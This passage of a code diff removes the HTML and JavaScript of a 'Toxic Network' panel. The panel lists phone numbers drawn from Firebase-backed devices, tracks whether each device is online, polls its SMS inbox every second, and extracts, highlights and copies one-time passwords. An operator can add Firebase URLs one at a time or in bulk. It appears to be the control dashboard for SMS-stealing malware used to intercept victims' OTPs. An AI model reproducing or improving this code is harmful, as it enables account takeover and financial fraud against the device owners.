-    const iconCls = isUnknown ? 'gray' : (isOnline ? '' : 'red');
-    const badgeCls = isOnline ? 'badge-online' : 'badge-offline';
-    const badgeTxt = isOnline ? 'ONLINE' : 'OFFLINE';
-    const cardCls = isOnline ? '' : 'offline';
-    const titleCls = isUnknown ? 'unknown' : '';
-    const confidence = n.confidence || 0;
-    let confBadge = '';
-    if(!isUnknown && confidence > 0){ confBadge = `<span class="confidence-badge">✓${confidence}x</span>`; }
-    else if(!isUnknown){ confBadge = `<span class="confidence-badge low">⚠1x</span>`; }
-    return `
-      <div class="num-card ${cardCls}">
-        <div class="num-icon ${iconCls}" onclick="openInboxGlobal(${numbers.indexOf(n)})">${isUnknown ? '?' : '◉'}</div>
-        <div class="num-info" onclick="openInboxGlobal(${numbers.indexOf(n)})">
-          <div class="num-title ${titleCls}">${escapeHtml(n.number)} ${confBadge}</div>
-          <div class="num-sub"><span class="pill">✉ ${n.msg_count} SMS</span>${n.otp_count > 0 ? `<span class="pill otp">🔑 ${n.otp_count} OTP</span>` : ''}</div>
-        </div>
-        <div class="${badgeCls}" onclick="openInboxGlobal(${numbers.indexOf(n)})"><span class="dot"></span>${badgeTxt}</div>
-      </div>`;
-  }).join('');
-}
-
-function openInboxGlobal(idx){ if(idx < 0 || idx >= numbers.length) return; openInbox(numbers[idx]); }
-
-async function openInbox(n){
-  currentNum = n; lastInboxSig = ''; allInboxMsgs = []; lastOtpSeen = '';
-  askNotificationPermission();
-  document.getElementById('list-view').classList.add('hidden');
-  document.getElementById('inbox-view').classList.remove('hidden');
-  const inboxNumEl = document.getElementById('inbox-num');
-  inboxNumEl.textContent = n.number;
-  if((n.number || '').startsWith('UNKNOWN-')){ inboxNumEl.className = 'inbox-num unknown'; }
-  else { inboxNumEl.className = 'inbox-num'; }
-  const statusEl = document.getElementById('inbox-status');
-  const statusTxt = document.getElementById('inbox-status-text');
-  if(n.online === true){ statusEl.className = 'inbox-status'; statusTxt.textContent = 'ONLINE'; }
-  else { statusEl.className = 'inbox-status offline'; statusTxt.textContent = 'OFFLINE'; }
-  document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> LOADING MESSAGES...</div>';
-  await loadInbox(false);
-  if(refreshTimer) clearInterval(refreshTimer);
-  refreshTimer = setInterval(()=>loadInbox(false), 1000);
-}
-
-function findTopNumber(msgs){
-  const counter = {}; const senderNums = new Set();
-  msgs.forEach(m => {
-    const found = (m.from || '').match(/(?<!\d)([6-9]\d{9})(?!\d)/g) || [];
-    found.forEach(n => senderNums.add(n));
-  });
-  msgs.forEach(m => {
-    const found = (m.message || '').match(/(?<!\d)([6-9]\d{9})(?!\d)/g) || [];
-    found.forEach(n => {
-      if(senderNums.has(n)) return;
-      if(n.startsWith('1800') || n.startsWith('1900') || n.startsWith('1991')) return;
-      counter[n] = (counter[n] || 0) + 1;
-    });
-  });
-  let topNum = null, topCount = 0;
-  for(const [num, cnt] of Object.entries(counter)){ if(cnt > topCount){ topNum = num; topCount = cnt; } }
-  return topNum ? {number: topNum, count: topCount} : null;
-}
-
-function updateTopNumberBadge(msgs){
-  const badge = document.getElementById('top-number-badge');
-  const top = findTopNumber(msgs);
-  if(top && top.count >= 2){
-    document.getElementById('tn-num').textContent = '📞 ' + top.number;
-    document.getElementById('tn-count-badge').textContent = top.count + 'x';
-    badge.classList.remove('hidden');
-  } else { badge.classList.add('hidden'); }
-}
-
-async function loadInbox(showLoader){
-  if(!currentNum) return;
-  if(showLoader){ document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> REFRESHING...</div>'; }
-  const controller = new AbortController();
-  const timeoutId = setTimeout(() => controller.abort(), 15000);
-  try{
-    const r = await fetch('/api/inbox?fb=' + encodeURIComponent(currentNum.firebase) + '&id=' + encodeURIComponent(currentNum.device_id) + '&num=' + encodeURIComponent(currentNum.number), { signal: controller.signal });
-    clearTimeout(timeoutId); const d = await r.json();
-    if(!d.success){ document.getElementById('sms-container').innerHTML = '<div class="empty">❌ '+(d.error||'ERROR')+'</div>'; return; }
-    const msgs = d.messages || []; allInboxMsgs = msgs;
-    if(msgs.length > 0){
-      const newest = msgs[0];
-      const newestOtp = newest.otp || extractOtp(newest.message);
-      const sig = (newest.timestamp || 0) + '|' + newestOtp + '|' + (newest.message||'').slice(0,40);
-      if(newestOtp && sig !== lastOtpSeen){ lastOtpSeen = sig; showOtpNotification(newestOtp, newest.from || 'Unknown', newest.message || ''); }
-    }
-    const sig = msgs.map(m => (m.timestamp||0) + '|' + (m.message||'').slice(0,40)).join('#');
-    if(sig !== lastInboxSig){ lastInboxSig = sig; renderMessages(); }
-  }catch(e){ clearTimeout(timeoutId); }
-}
-
-function timeAgo(ts, now){
-  if(!ts) return '';
-  const diff = now - ts;
-  if(diff < 10) return 'NOW';
-  if(diff < 60) return diff + 's';
-  if(diff < 3600) return Math.floor(diff/60) + 'm';
-  if(diff < 86400) return Math.floor(diff/3600) + 'h';
-  return Math.floor(diff/86400) + 'd';
-}
-
-function highlightPhoneNumbers(text){ return text.replace(/(?<!\d)([6-9]\d{9})(?!\d)/g, '<span class="phone-highlight">$1</span>'); }
-
-function renderMessages(){
-  const box = document.getElementById('sms-container');
-  const now = Math.floor(Date.now() / 1000);
-  let msgs = [...allInboxMsgs].sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)).slice(0, 60);
-  updateTopNumberBadge(msgs);
-  if(!msgs.length){ box.innerHTML = '<div class="empty">📭 NO SMS</div>'; return; }
-  box.innerHTML = '<div class="sms-list">' + msgs.map(m => {
-    const otp = m.otp || extractOtp(m.message);
-    let body;
-    if(otp){
-      body = escapeHtml(m.message).replace(otp, `<span class="otp-highlight">${otp}</span>`);
-      body = highlightPhoneNumbers(body);
-    } else { body = highlightPhoneNumbers(escapeHtml(m.message)); }
-    const copyBtn = otp ? `<button class="otp-copy-btn" onclick="copyOtp('${otp}')">📋 COPY OTP ${otp}</button>` : '';
-    const ts = m.timestamp || 0; const isFresh = ts >= (now - 120);
-    const cls = isFresh ? 'fresh' : (otp ? 'otp-item' : '');
-    const timeStr = m.date_string ? m.date_string : fmtTime(ts); const ago = timeAgo(ts, now);
-    const newBadge = isFresh ? '<span class="new-badge">NEW</span>' : '';
-    const hasNumber = /[6-9]\d{9}/.test(m.message || '');
-    let typeBadge = '';
-    if(otp) typeBadge = '<span class="msg-type-badge otp">OTP</span>';
-    else if(hasNumber) typeBadge = '<span class="msg-type-badge number">NUM</span>';
-    return `
-      <div class="sms-item ${cls}">
-        ${typeBadge}
-        <div class="sms-head">
-          <div class="sender">${escapeHtml(m.from || 'UNKNOWN')} ${newBadge}</div>
-          <div style="text-align:right"><div class="sms-time ${isFresh?'fresh':''}">${escapeHtml(timeStr)}</div><div class="time-ago ${isFresh?'fresh':''}">${ago}</div></div>
-        </div>
-        <div class="sms-body">${body}</div>
-        ${copyBtn}
-      </div>`;
-  }).join('') + '</div>';
-}
-
-function backToList(){
-  document.getElementById('inbox-view').classList.add('hidden');
-  document.getElementById('list-view').classList.remove('hidden');
-  if(refreshTimer){ clearInterval(refreshTimer); refreshTimer = null; }
-  currentNum = null;
-}
-
-function extractOtp(text){
-  if(!text) return '';
-  const t = String(text);
-  let m = t.match(/(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\d]{0,30}(\d{4,8})/i); if(m) return m[1];
-  m = t.match(/(\d{4,8})[^\d]{0,30}(?:is your|otp|one[- ]time|code)/i); if(m) return m[1];
-  m = t.match(/#(\d{4,8})/); if(m) return m[1];
-  return '';
-}
-
-function fmtTime(ts){
-  if(!ts) return '';
-  try{
-    let t = parseInt(ts); if(t > 1e12) t = Math.floor(t/1000); if(t < 1e9) return String(ts);
-    const d = new Date(t * 1000);
-    const opts = { timeZone: 'Asia/Kolkata', hour12: true, day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' };
-    return d.toLocaleString('en-IN', opts).replace(',', ' |');
-  }catch(e){ return String(ts); }
-}
-
-function copyOtp(code){
-  const done = ()=>toast('✅ COPIED: ' + code);
-  if(navigator.clipboard){ navigator.clipboard.writeText(code).then(done).catch(()=>{ const ta = document.createElement('textarea'); ta.value = code; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); done(); }); }
-}
-
-function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }
-
-checkConn();
-loadPanelState();
-loadNumbers();
-setInterval(checkConn, 8000);
-setInterval(loadPanelState, 5000);
-setInterval(()=>{ if(!currentNum) loadNumbers(); }, 5000);
-</script>
-</body>
-</html>
-"""
-
-
-# ==================== PERSONAL OTP PANEL ====================
-PERSONAL_OTP_HTML = r"""<!DOCTYPE html>
-<html lang="en"><head><meta charset="UTF-8"><title>Toxic Network — Personal OTP</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<meta name="theme-color" content="#a855f7">
-<style>""" + HACKER_BASE_CSS + r"""
-body{background:#0a0e1a;color:#e0e6ff;padding:0 0 40px;background-image:radial-gradient(ellipse at top,#14091a 0%,#0a0e1a 60%)}
-.topbar{background:#0a0e1a;border-bottom:1px solid #1f2937;padding:10px 14px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;flex-wrap:wrap;gap:8px;padding-top:calc(10px + env(safe-area-inset-top));box-shadow:0 2px 20px rgba(168,85,247,.08)}
-.brand{font-size:16px;font-weight:900;letter-spacing:2px;flex-shrink:0}
-.brand .toxic{background:linear-gradient(90deg,#a855f7,#00e5ff);-webkit-background-clip:text;background-clip:text;color:transparent;text-shadow:0 0 15px rgba(168,85,247,.3)}
-.brand .net{color:#e0e6ff}
-.top-actions{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
-.refresh-btn{background:linear-gradient(135deg,#a855f7,#00e5ff);color:#0a0e1a;border:none;width:42px;height:42px;border-radius:8px;font-size:18px;display:flex;align-items:center;justify-content:center;box-shadow:0 0 15px rgba(168,85,247,.4);padding:0;font-weight:900}
-.refresh-btn:active{transform:scale(.9) rotate(180deg)}
-.refresh-btn.spinning{animation:spin 1s linear infinite}
-.nav{display:flex;gap:6px;align-items:center;flex-wrap:wrap;order:3;width:100%;justify-content:space-between;margin-top:8px}
-@media(min-width:640px){.nav{order:0;width:auto;margin-top:0}}
-.nav-link{padding:10px 14px;border-radius:8px;text-decoration:none;font-size:11px;font-weight:700;color:#7a85a8;background:#111827;border:1px solid #1f2937;white-space:nowrap;min-height:44px;display:inline-flex;align-items:center;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
-.nav-link:hover{color:#a855f7;border-color:rgba(168,85,247,.3)}
-.nav-link.active{background:linear-gradient(135deg,#a855f7,#00e5ff);color:#0a0e1a;border-color:transparent;box-shadow:0 0 15px rgba(168,85,247,.4)}
-.nav-link.purple{background:rgba(0,255,65,.1);color:#00ff41;border-color:rgba(0,255,65,.3)}
-.conn{display:flex;align-items:center;gap:6px;font-size:10px;font-weight:700;padding:6px 10px;border-radius:6px;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
-.conn.online{color:#00ff41;background:rgba(0,255,65,.1);border:1px solid rgba(0,255,65,.3)}
-.conn.offline{color:#ff3860;background:rgba(255,56,96,.1);border:1px solid rgba(255,56,96,.3)}
-.conn.loading{color:#ffd700;background:rgba(255,215,0,.1);border:1px solid rgba(255,215,0,.3)}
-.conn .dot{width:7px;height:7px;border-radius:50%;background:currentColor;box-shadow:0 0 8px currentColor}
-.conn.online .dot{animation:pulse 1.5s infinite}
-.container{max-width:900px;margin:0 auto;padding:14px}
-.stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px}
-.stat{background:#111827;border:1px solid #1f2937;border-radius:10px;padding:14px;position:relative;overflow:hidden}
-.stat::before{content:"";position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,currentColor,transparent);opacity:.5}
-.stat .label{font-size:9px;color:#4a5270;font-weight:700;letter-spacing:2px;text-transform:uppercase;margin-bottom:6px;font-family:'Courier New',monospace}
-.stat .value{font-size:26px;font-weight:900;letter-spacing:-1px;text-shadow:0 0 15px currentColor}
-.stat.total{color:#00e5ff}
-.stat.online{color:#00ff41}
-.stat.offline{color:#ff3860}
-.stat.otp{color:#a855f7}
-.quick{background:#111827;border:1px solid #1f2937;border-radius:10px;padding:14px;margin-bottom:14px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px}
-.quick .info{font-size:12px;color:#7a85a8;letter-spacing:1px;font-family:'Courier New',monospace}
-.quick .info b{color:#a855f7;font-size:14px;text-shadow:0 0 8px rgba(168,85,247,.5)}
-.filter-live{display:flex;gap:8px;margin-bottom:14px;flex-wrap:wrap}
-.filter-live-btn{flex:1;min-width:130px;padding:14px 12px;border-radius:8px;border:1px solid #1f2937;cursor:pointer;font-size:11px;font-weight:700;display:flex;align-items:center;justify-content:center;gap:6px;background:#111827;font-family:'Courier New',monospace;min-height:52px;letter-spacing:1px;text-transform:uppercase;color:#7a85a8}
-.filter-live-btn:hover{border-color:#a855f7;color:#a855f7}
-.filter-live-btn.online{color:#00ff41;border-color:rgba(0,255,65,.3)}
-.filter-live-btn.offline{color:#ff3860;border-color:rgba(255,56,96,.3)}
-.filter-live-btn.active-filter{background:linear-gradient(135deg,rgba(168,85,247,.15),rgba(0,229,255,.15));box-shadow:0 0 15px rgba(168,85,247,.3)}
-.filter-live-btn .count-badge{background:rgba(0,0,0,.3);padding:2px 8px;border-radius:4px;font-size:10px;border:1px solid currentColor}
-.list-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;padding:0 4px}
-.list-header h2{font-size:12px;font-weight:700;color:#a855f7;letter-spacing:2px;text-transform:uppercase;font-family:'Courier New',monospace}
-.list-header .count{font-size:11px;color:#00e5ff;background:rgba(0,229,255,.1);border:1px solid rgba(0,229,255,.3);padding:3px 10px;border-radius:4px;font-weight:700;font-family:'Courier New',monospace}
-.search-box{margin-bottom:12px}
-.search-box input{width:100%;padding:14px 16px;border-radius:8px;border:1.5px solid #1f2937;background:#111827;outline:none;color:#e0e6ff;letter-spacing:1px;font-family:'Courier New',monospace}
-.search-box input:focus{border-color:#a855f7;box-shadow:0 0 0 3px rgba(168,85,247,.15)}
-.search-box input::placeholder{color:#4a5270}
-.num-card{background:#111827;border:1px solid #1f2937;border-radius:10px;padding:14px;margin-bottom:10px;display:flex;align-items:center;gap:12px;cursor:pointer;min-height:70px;position:relative;overflow:hidden;transition:.15s}
-.num-card::before{content:"";position:absolute;left:0;top:0;bottom:0;width:3px;background:#a855f7;opacity:0;transition:.2s}
-.num-card:hover::before{opacity:1}
-.num-card:hover{border-color:rgba(168,85,247,.3);background:#14091a}
-.num-card:active{transform:scale(.99)}
-.num-icon{width:42px;height:42px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:19px;flex-shrink:0;background:rgba(0,255,65,.1);border:1px solid rgba(0,255,65,.3);color:#00ff41}
-.num-icon.red{background:rgba(255,56,96,.1);border-color:rgba(255,56,96,.3);color:#ff3860}
-.num-icon.gray{background:rgba(122,133,168,.1);border-color:rgba(122,133,168,.3);color:#7a85a8}
-.num-info{flex:1;min-width:0}
-.num-title{font-size:14px;font-weight:700;color:#e0e6ff;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;letter-spacing:.5px;font-family:'Courier New',monospace}
-.num-title.unknown{color:#7a85a8;font-style:italic}
-.num-sub{font-size:10px;color:#7a85a8;margin-top:4px;display:flex;gap:4px;flex-wrap:wrap;letter-spacing:.5px;font-family:'Courier New',monospace}
-.num-sub .pill{background:#0a0e1a;border:1px solid #1f2937;padding:2px 7px;border-radius:4px;color:#7a85a8;font-size:9px;font-weight:700}
-.num-sub .pill.otp{background:rgba(168,85,247,.1);color:#a855f7;border-color:rgba(168,85,247,.3)}
-.badge-online{display:flex;align-items:center;gap:5px;font-size:10px;color:#00ff41;font-weight:700;flex-shrink:0;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
-.badge-online .dot{width:7px;height:7px;border-radius:50%;background:#00ff41;box-shadow:0 0 8px #00ff41;animation:pulse 1.5s infinite}
-.badge-offline{display:flex;align-items:center;gap:5px;font-size:10px;color:#ff3860;font-weight:700;flex-shrink:0;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
-.badge-offline .dot{width:7px;height:7px;border-radius:50%;background:#ff3860;box-shadow:0 0 8px #ff3860}
-.fb-add-card{background:linear-gradient(135deg,rgba(0,255,65,.08),rgba(168,85,247,.08));border:1px solid rgba(0,255,65,.3);border-radius:10px;padding:16px;margin-bottom:14px}
-.fb-add-card h3{font-size:12px;font-weight:900;color:#00ff41;margin-bottom:10px;display:flex;align-items:center;gap:8px;letter-spacing:1.5px;text-transform:uppercase;font-family:'Courier New',monospace}
-.fb-add-row{display:flex;gap:8px;flex-wrap:wrap}
-.fb-add-row input{flex:1;min-width:180px;padding:14px 12px;border-radius:8px;border:1.5px solid #1f2937;background:#0a0e1a;outline:none;color:#e0e6ff;font-family:'Courier New',monospace;letter-spacing:1px}
-.fb-add-row input:focus{border-color:#00ff41;box-shadow:0 0 0 3px rgba(0,255,65,.15)}
-.fb-add-row input::placeholder{color:#4a5270}
-.fb-add-row button{padding:14px 18px;border:none;border-radius:8px;font-weight:900;font-size:12px;min-height:50px;letter-spacing:1.5px;text-transform:uppercase;font-family:'Courier New',monospace}
-.fb-add-row button.primary{background:linear-gradient(135deg,#00ff41,#a855f7);color:#0a0e1a}
-.fb-add-row button.gray{background:#1f2937;color:#7a85a8;border:1px solid #374151}
-.fb-add-row button:active{transform:scale(.96)}
-.bulk-area{margin-top:10px;display:none}
-.bulk-area textarea{width:100%;padding:14px 12px;border-radius:8px;border:1.5px solid #1f2937;background:#0a0e1a;font-size:12px;min-height:120px;font-family:'Courier New',monospace;outline:none;color:#e0e6ff;resize:vertical;letter-spacing:.5px}
-.bulk-area textarea:focus{border-color:#a855f7;box-shadow:0 0 0 3px rgba(168,85,247,.15)}
-.bulk-area button{margin-top:8px;padding:12px 18px;border:none;border-radius:8px;font-weight:900;font-size:12px;background:linear-gradient(135deg,#a855f7,#00e5ff);color:#0a0e1a;min-height:48px;letter-spacing:1.5px;text-transform:uppercase;font-family:'Courier New',monospace}
-.fb-msg{margin-top:10px;padding:12px 14px;border-radius:8px;font-size:11px;display:none;letter-spacing:1px;font-family:'Courier New',monospace}
-.fb-msg.ok{background:rgba(0,255,65,.1);color:#00ff41;border:1px solid rgba(0,255,65,.3);display:block}
-.fb-msg.err{background:rgba(255,56,96,.1);color:#ff3860;border:1px solid rgba(255,56,96,.3);display:block}
-.my-fb-list{display:grid;gap:8px;margin-top:10px}
-.my-fb-card{background:#0a0e1a;border:1px solid #1f2937;border-radius:8px;padding:12px;display:flex;align-items:center;gap:10px}
-.my-fb-card .fb-icon{width:38px;height:38px;border-radius:6px;background:rgba(168,85,247,.15);border:1px solid rgba(168,85,247,.3);display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0;color:#a855f7}
-.my-fb-card .fb-info{flex:1;min-width:0}
-.my-fb-card .fb-label{font-size:11px;font-weight:700;color:#a855f7;word-break:break-all;letter-spacing:1px;font-family:'Courier New',monospace}
-.my-fb-card .fb-hash{font-size:9px;color:#4a5270;font-family:'Courier New',monospace;margin-top:2px;letter-spacing:1px}
-.my-fb-card .fb-actions button{padding:10px 14px;font-size:11px;background:rgba(255,56,96,.1);color:#ff3860;border:1px solid rgba(255,56,96,.3);border-radius:6px;font-weight:700;min-height:42px;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
-.my-fb-card .fb-actions button:hover{background:rgba(255,56,96,.2)}
-.inbox-header{background:#111827;border:1px solid #1f2937;border-radius:10px;padding:16px;margin-bottom:12px}
-.inbox-top{display:flex;align-items:center;gap:10px;margin-bottom:12px}
-.back-btn{background:#0a0e1a;border:1px solid #1f2937;width:42px;height:42px;border-radius:8px;font-size:18px;cursor:pointer;color:#a855f7;font-weight:700;text-decoration:none;display:inline-flex;align-items:center;justify-content:center;flex-shrink:0}
-.back-btn:hover{background:rgba(168,85,247,.1);border-color:rgba(168,85,247,.4)}
-.inbox-num{font-size:16px;font-weight:900;color:#a855f7;letter-spacing:1px;text-shadow:0 0 10px rgba(168,85,247,.5);font-family:'Courier New',monospace}
-.inbox-status{display:flex;align-items:center;gap:6px;font-size:10px;color:#00ff41;font-weight:700;margin-top:2px;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
-.inbox-status .dot{width:7px;height:7px;border-radius:50%;background:#00ff41;box-shadow:0 0 8px #00ff41;animation:pulse 1.5s infinite}
-.inbox-status.offline{color:#ff3860}
-.inbox-status.offline .dot{background:#ff3860;box-shadow:0 0 8px #ff3860;animation:none}
-.inbox-meta{font-size:10px;color:#4a5270;display:flex;justify-content:space-between;align-items:center;letter-spacing:1px;font-family:'Courier New',monospace}
-.refresh-icon{cursor:pointer;font-size:20px;color:#a855f7;padding:6px;min-width:36px;min-height:36px;display:flex;align-items:center;justify-content:center}
-.refresh-icon.spinning{animation:spin 1s linear infinite}
-.top-number-badge{background:linear-gradient(135deg,rgba(255,215,0,.1),rgba(255,149,0,.1));border:1px solid rgba(255,215,0,.4);border-radius:10px;padding:12px 14px;margin-bottom:12px;display:flex;align-items:center;gap:10px;font-size:12px;font-weight:700;color:#ffd700;font-family:'Courier New',monospace}
-.top-number-badge .tn-icon{font-size:22px;flex-shrink:0}
-.top-number-badge .tn-info{flex:1;min-width:0}
-.top-number-badge .tn-num{font-size:16px;font-weight:900;color:#ffd700;letter-spacing:.5px;word-break:break-all;text-shadow:0 0 8px rgba(255,215,0,.5)}
-.top-number-badge .tn-count{font-size:10px;color:#ffd700;font-weight:600;margin-top:2px;opacity:.8;letter-spacing:1px}
-.top-number-badge .tn-highlight{background:rgba(255,215,0,.2);color:#ffd700;padding:2px 8px;border-radius:4px;font-weight:900;font-size:10px;border:1px solid rgba(255,215,0,.4)}
-.sms-list{background:#111827;border:1px solid #1f2937;border-radius:10px;overflow:hidden}
-.sms-item{padding:16px;border-bottom:1px solid #1f2937;position:relative}
-.sms-item:last-child{border-bottom:none}
-.sms-item.fresh{background:linear-gradient(90deg,rgba(0,255,65,.08),transparent 60%);border-left:3px solid #00ff41}
-.sms-item.otp-item{background:linear-gradient(90deg,rgba(168,85,247,.08),transparent 60%);border-left:3px solid #a855f7}
-.sms-item .msg-type-badge{position:absolute;top:10px;right:10px;font-size:9px;font-weight:900;padding:2px 7px;border-radius:4px;letter-spacing:1px;font-family:'Courier New',monospace}
-.sms-item .msg-type-badge.otp{background:linear-gradient(135deg,#a855f7,#7c3aed);color:#fff;box-shadow:0 0 10px rgba(168,85,247,.4)}
-.sms-item .msg-type-badge.number{background:linear-gradient(135deg,#00ff41,#00e5ff);color:#0a0e1a}
-.sms-head{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:8px;gap:8px;flex-wrap:wrap}
-.sender{font-size:11px;font-weight:900;color:#ff3860;display:flex;align-items:center;flex-wrap:wrap;font-family:'Courier New',monospace;text-transform:uppercase}
-.new-badge{background:linear-gradient(135deg,#ff3860,#ff9500);color:#fff;font-size:9px;font-weight:900;padding:2px 7px;border-radius:4px;margin-left:6px;letter-spacing:1px;animation:pulse 1s infinite}
-.sms-time{font-size:10px;color:#4a5270;white-space:nowrap;font-family:'Courier New',monospace}
-.sms-time.fresh{color:#00ff41;font-weight:900}
-.time-ago{font-size:9px;color:#4a5270;font-weight:600;margin-top:2px;text-align:right;font-family:'Courier New',monospace}
-.time-ago.fresh{color:#00ff41}
-.sms-body{font-size:13px;color:#c5d0e6;line-height:1.6;word-break:break-word;white-space:pre-wrap;font-family:'Courier New',monospace}
-.sms-body .phone-highlight{background:rgba(255,215,0,.15);color:#ffd700;padding:1px 5px;border-radius:3px;font-weight:700;border:1px solid rgba(255,215,0,.3)}
-.otp-highlight{background:linear-gradient(135deg,rgba(0,255,65,.2),rgba(0,229,255,.2));color:#00ff41;padding:2px 6px;border-radius:4px;font-weight:900;border:1px solid rgba(0,255,65,.4)}
-.otp-copy-btn{display:inline-flex;align-items:center;gap:6px;margin-top:10px;padding:10px 16px;background:linear-gradient(135deg,#00ff41,#00e5ff);color:#0a0e1a;border:none;border-radius:6px;font-weight:900;font-size:11px;min-height:40px;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
-.otp-copy-btn:active{transform:scale(.96)}
-.empty{text-align:center;padding:50px 20px;color:#4a5270;font-size:12px;background:#111827;border:1px solid #1f2937;border-radius:10px;letter-spacing:1px;font-family:'Courier New',monospace}
-.loading-text{text-align:center;padding:20px;color:#4a5270;font-size:12px;background:#111827;border:1px solid #1f2937;border-radius:8px;margin-bottom:14px;letter-spacing:1px;font-family:'Courier New',monospace}
-.spinner{display:inline-block;width:14px;height:14px;border:2px solid #1f2937;border-top-color:#a855f7;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:8px}
-.live-badge{display:inline-flex;align-items:center;gap:4px;background:rgba(0,255,65,.15);color:#00ff41;font-size:9px;font-weight:700;padding:3px 8px;border-radius:4px;margin-left:6px;border:1px solid rgba(0,255,65,.3);font-family:'Courier New',monospace}
-.live-badge .dot{width:6px;height:6px;border-radius:50%;background:#00ff41;animation:pulse 1.2s infinite}
-.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(100px);background:#a855f7;color:#fff;padding:14px 24px;border-radius:8px;font-weight:900;font-size:13px;z-index:9999;transition:transform .3s;pointer-events:none;max-width:90vw;text-align:center;letter-spacing:1px;font-family:'Courier New',monospace;box-shadow:0 0 30px rgba(168,85,247,.5)}
-.toast.show{transform:translateX(-50%) translateY(0)}
-.hidden{display:none !important}
-@media(min-width:600px){.stats{grid-template-columns:repeat(4,1fr)}}</style></head><body>
-
-<div class="topbar">
-<div class="brand"><span class="toxic">☣ TOXIC</span> <span class="net">PERSONAL</span></div>
-<div class="top-actions">
-<button class="refresh-btn" id="refresh-btn" onclick="manualRefresh()" title="Refresh">⟳</button>
-<div class="conn loading" id="conn-badge"><span class="dot"></span><span id="conn-text">...</span></div>
-</div>
-<div class="nav"><a href="/" class="nav-link purple">◉ NUMBERS</a><a href="/otp" class="nav-link active">◈ PERSONAL OTP</a></div>
-</div>
-
-<div class="container">
-<div id="list-view">
-
-<div class="fb-add-card">
-<h3>➕ ADD YOUR FIREBASE</h3>
-<div class="fb-add-row">
-<input id="fb-url" placeholder="https://xxx.firebaseio.com" onkeypress="if(event.key==='Enter')addFirebase()" type="url" autocomplete="off">
-<button class="primary" id="add-btn" onclick="addFirebase()">ADD</button>
-<button class="gray" id="bulk-toggle" onclick="toggleBulk()">BULK</button>
-</div>
-<div id="bulk-area" class="bulk-area">
-<textarea id="fb-bulk" placeholder="Ek line me ek URL paste karo"></textarea>
-<button onclick="bulkAdd()">📥 IMPORT ALL</button>
-</div>
-<div id="add-msg" class="fb-msg"></div>
-<div class="my-fb-list" id="my-fb-list"></div>
-</div>
-
-<div class="stats">
-<div class="stat total" id="stat-total"><div class="label">TOTAL</div><div class="value" id="s-total">0</div></div>
-<div class="stat online" id="stat-online"><div class="label">ONLINE</div><div class="value" id="s-online">0</div></div>
-<div class="stat offline" id="stat-offline"><div class="label">OFFLINE</div><div class="value" id="s-offline">0</div></div>
-<div class="stat otp" id="stat-otp"><div class="label">OTP RATE</div><div class="value" id="s-otp">0%</div></div>
-</div>
-<div class="quick"><div class="info">▸ ACTIVE NUMBERS : <b id="q-dev">0</b></div></div>
-<div class="filter-live">
-<button class="filter-live-btn online" id="btn-online" onclick="setLocalFilter('online')">● ONLINE <span class="count-badge" id="badge-online">0</span></button>
-<button class="filter-live-btn offline" id="btn-offline" onclick="setLocalFilter('offline')">● OFFLINE <span class="count-badge" id="badge-offline">0</span></button>
-</div>
-<div id="loading-text" class="loading-text"><span class="spinner"></span><span id="loading-msg">ADD A FIREBASE TO START...</span></div>
-<div id="list-content" class="hidden">
-<div class="search-box"><input id="search-num" placeholder="▸ SEARCH NUMBER / DEVICE" oninput="renderNumbers()"></div>
-<div class="list-header"><h2 id="list-title">◉ ALL NUMBERS <span class="live-badge" id="live-badge" style="display:none"><span class="dot"></span>LIVE</span></h2><span class="count" id="num-count">0</span></div>
-<div id="num-list"></div>
-</div>
-</div>
-
-<div id="inbox-view" class="hidden">
-<div class="inbox-header">
-<div class="inbox-top"><a href="#" class="back-btn" onclick="event.preventDefault();backToList()">←</a><div style="flex:1"><div class="inbox-num" id="inbox-num">+91 ------</div><div class="inbox-status" id="inbox-status"><span class="dot"></span><span id="inbox-status-text">Online</span></div></div></div>
-<div class="inbox-meta"><span>⚡ LIVE · AUTO 1S · LATEST 60 SMS</span><span class="refresh-icon" onclick="loadInbox(true)">⟳</span></div>
-</div>
-<div id="top-number-badge" class="top-number-badge hidden">
-<div class="tn-icon">🏆</div>
-<div class="tn-info">
-<div class="tn-num" id="tn-num">-</div>
-<div class="tn-count">MOST FREQUENT SMS NUMBER <span class="tn-highlight" id="tn-count-badge">0x</span></div>
-</div>
-</div>
-<div id="sms-container"></div>
-</div>
-</div>
-
-<div id="toast" class="toast"></div>
-
-<script>
-const COOKIE_NAME = "toxic_personal_firebases_v24";
-let myFirebases = [];
-let allNumbers = [];
-let numbers = [];
-let currentNum = null;
-let refreshTimer = null;
-let lastSig = '';
-let lastInboxSig = '';
-let allInboxMsgs = [];
-let localFilter = 'all';
-let lastOtpSeen = '';
-let notifPermissionAsked = false;
-
-function getCookie(name){
-  const cookies = document.cookie.split(';');
-  for(let c of cookies){
